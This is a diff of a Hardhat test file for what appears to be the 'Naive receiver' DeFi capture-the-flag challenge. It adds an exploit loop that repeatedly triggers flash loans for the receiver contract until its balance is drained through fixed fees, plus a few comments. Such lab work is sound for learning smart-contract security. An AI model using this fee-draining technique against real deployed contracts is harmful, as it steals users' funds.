@@ -17,6 +17,8 @@ describe('[Challenge] Naive receiver', function () {
         const LenderPoolFactory = await ethers.getContractFactory('NaiveReceiverLenderPool', deployer);
         const FlashLoanReceiverFactory = await ethers.getContractFactory('FlashLoanReceiver', deployer);
 
+        // why provider have ethers ?? 
+
         this.pool = await LenderPoolFactory.deploy();
         await deployer.sendTransaction({ to: this.pool.address, value: ETHER_IN_POOL });
         
@@ -24,13 +26,20 @@ describe('[Challenge] Naive receiver', function () {
         expect(await this.pool.fixedFee()).to.be.equal(ethers.utils.parseEther('1'));
 
         this.receiver = await FlashLoanReceiverFactory.deploy(this.pool.address);
+
+        // this line will call to the receive() function in the contract 
         await deployer.sendTransaction({ to: this.receiver.address, value: ETHER_IN_RECEIVER });
         
         expect(await ethers.provider.getBalance(this.receiver.address)).to.be.equal(ETHER_IN_RECEIVER);
     });
 
     it('Exploit', async function () {
+
         /** CODE YOUR EXPLOIT HERE */   
+        while (await ethers.provider.getBalance(this.receiver.address) > 0) {
+            console.log(await ethers.provider.getBalance(this.receiver.address));
+            this.pool.flashLoan(this.receiver.address, 0);
+        }
     });
 
     after(async function () {
@@ -39,7 +48,7 @@ describe('[Challenge] Naive receiver', function () {
         // All ETH has been drained from the receiver
         expect(
             await ethers.provider.getBalance(this.receiver.address)
-        ).to.be.equal('0');
+        ).to.be.equal(ethers.utils.parseEther('0'));
         expect(
             await ethers.provider.getBalance(this.pool.address)
         ).to.be.equal(ETHER_IN_POOL.add(ETHER_IN_RECEIVER));
